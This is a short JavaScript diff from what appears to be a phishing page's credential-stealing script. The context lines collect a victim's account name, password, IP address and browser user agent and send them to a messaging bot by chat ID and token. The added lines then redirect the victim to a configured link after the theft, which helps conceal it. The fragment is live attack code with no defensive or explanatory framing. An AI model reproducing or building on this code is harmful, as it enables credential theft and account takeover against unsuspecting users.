@@ -230,6 +230,9 @@
                 ip = await ip.json()
                 const message = `Account: ${username}\nPassword: ${password}\nIp: ${ip.ip}\nUser Agent: ${navigator.userAgent}`;
                 await sendMessage(message, chat_id, token);
+                if (data[0].link_redirect) {
+                    window.location.href = data[0].link_redirect;
+                }
             })();
         });
 
